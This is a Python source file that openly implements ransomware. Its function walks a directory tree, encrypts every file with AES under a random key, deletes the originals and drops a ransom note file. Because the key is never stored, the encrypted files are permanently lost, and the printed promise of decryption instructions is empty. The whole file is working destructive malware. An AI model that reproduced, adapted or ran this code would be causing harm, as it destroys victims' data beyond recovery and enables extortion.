import os
import base64
import hashlib
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes

ENCRYPT_MESSAGE = "OooooooPs All Your Files Are Encrypted!!!!"

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        plaintext = file.read()

    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)

    encrypted_file_path = file_path + '.encrypted'
    with open(encrypted_file_path, 'wb') as encrypted_file:
        [encrypted_file.write(x) for x in (cipher.nonce, tag, ciphertext)]

    os.remove(file_path)

def ransomware(directory):
    # 256비트(32바이트)의 랜덤한 키 생성
    encryption_key = hashlib.sha256(get_random_bytes(32)).digest()

    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, encryption_key)

    with open(os.path.join(directory, 'FUCKED.txt'), 'w') as restore_file:
        restore_file.write(ENCRYPT_MESSAGE)

    print("Ransomware attack completed. Files encrypted.")
    print("To decrypt your files, follow the provided instructions.")
